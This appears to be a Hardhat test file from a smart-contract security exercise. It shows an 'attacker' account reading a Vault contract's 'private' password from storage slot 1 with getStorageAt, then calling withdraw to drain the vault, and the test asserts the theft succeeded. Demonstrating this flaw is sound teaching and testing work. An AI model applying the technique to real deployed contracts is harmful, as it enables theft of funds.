import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Visibility Test", function () {
  // We define a fixture to reuse the same setup in every test.
  // We use loadFixture to run this setup once, snapshot that state,
  // and reset Hardhat Network to that snapshot in every test.
  async function deployVaultWithPassword() {
    const [deployer, attacker] = await ethers.getSigners();

    const Vault = await ethers.getContractFactory("Vault", deployer);
    const vault = await Vault.deploy(ethers.utils.formatBytes32String("myPassword"));
    
    return {vault, deployer, attacker};
  }

  describe("Vault", function () {
    it("Should by possible to access to its private variables", async () => {
      const { vault, attacker } = await loadFixture(deployVaultWithPassword);

      let attackerBalance = await ethers.provider.getBalance(attacker.address);

      let pwd = ethers.provider.getStorageAt(vault.address, 1);

      await vault.connect(attacker).withdraw(pwd);

      let finalBalance = await ethers.provider.getBalance(vault.address);
      let finalAttackerBalance = await ethers.provider.getBalance(attacker.address);

      expect(finalBalance).to.eq(0);
      expect(attackerBalance).to.be.lt(finalAttackerBalance);
    });
  });
});
